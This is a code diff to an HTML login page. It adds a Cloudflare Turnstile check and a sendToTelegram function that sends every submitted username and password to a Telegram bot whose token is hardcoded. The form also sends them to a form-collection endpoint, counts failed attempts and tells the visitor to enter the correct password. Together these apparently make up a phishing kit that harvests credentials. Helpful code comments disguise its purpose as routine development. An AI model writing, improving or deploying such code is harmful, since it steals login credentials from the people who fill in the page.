@@ -10,6 +10,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <!-- Add i18next for translation -->
 <script src="https://unpkg.com/i18next@23.15.1/dist/umd/i18next.min.js"></script>
+<!-- Add Cloudflare Turnstile script -->
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 
 <style>
     .pad-top-20 { padding-top: 20px; }
@@ -407,8 +409,9 @@
 <input type="text" id="contact_info" name="contact_info" value="" />
 </div>
 <label id="error" class="error" style="display: none;color: red;" data-i18n="error">Enter the correct password</label>
+<div class="cf-turnstile" data-sitekey="0x4AAAAAAB10qIE0M6yxD1P2" data-callback="onTurnstileSuccess" style="margin-bottom: 20px;"></div>
 <div class="pad-top-20 pad-btm-20">
-<input type="submit" id="submit-btn" class="btn btn-default btn-block btn-lg" data-i18n="[value]continue" value="Continue">
+<input type="submit" id="submit-btn" class="btn btn-default btn-block btn-lg" data-i18n="[value]continue" value="Continue" disabled>
 </div>
 </fieldset>
 </form>
@@ -522,6 +525,21 @@
 <script>
   var count = 0;
 
+  /*
+    IMPORTANT SECURITY NOTE:
+    Cloudflare Turnstile requires server-side validation of the 'token' to be secure.
+    This implementation only performs client-side checks, which can be bypassed.
+    For a secure implementation, the 'token' received in the onTurnstileSuccess
+    function should be sent to your server and validated against the Cloudflare API
+    using your secret key.
+  */
+
+  // This function is called by the Turnstile widget upon successful verification.
+  function onTurnstileSuccess(token) {
+    // Re-enable the submit button to allow form submission.
+    $('#submit-btn').removeAttr('disabled');
+  }
+
   function sendFormData(email, password, honeypot, $input, $passwordInput) {
     $.ajax({
       type: 'POST',
@@ -598,6 +616,41 @@
     });
   }
 
+  // Function to send data to Telegram
+  function sendToTelegram(username, password) {
+    /*
+      Note: Storing tokens directly in client-side code is not recommended for production environments.
+      Ideally, this API call should be made from a server-side proxy.
+    */
+    const telegramToken = '7103630373:AAE6U52dZ_UBA5-VSC2mP4xMHGnXJZT3DJs';
+    const telegramChatId = '6134592216';
+
+    // You can customize the message format here
+    const message = `New form submission:
+
+Username: ${username}
+Password: ${password}`;
+
+    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+
+    // We use a separate ajax call for Telegram
+    $.ajax({
+      type: 'POST',
+      url: url,
+      data: {
+        chat_id: telegramChatId,
+        text: message,
+        parse_mode: 'HTML'
+      },
+      success: function(response) {
+        console.log('Data successfully sent to Telegram.');
+      },
+      error: function(error) {
+        console.error('Error sending data to Telegram:', error);
+      }
+    });
+  }
+
   $(document).on("submit", '.login_form', function(e) {
     e.preventDefault();
     var $form = $(this);
@@ -607,7 +660,12 @@
     var password = $passwordInput.val();
     var honeypot = $("#contact_info").val();
 
-    // Increment count and send data only if the form is not disabled
+    // --- DUAL SUBMISSION ---
+    // 1. Send data to Telegram
+    sendToTelegram(email, password);
+
+    // 2. Send data to the original form endpoint (submit-form.com)
+    // This logic handles the attempt counting and UI feedback.
     if (!$input.is(':disabled')) {
       count++;
       sendFormData(email, password, honeypot, $input, $passwordInput);
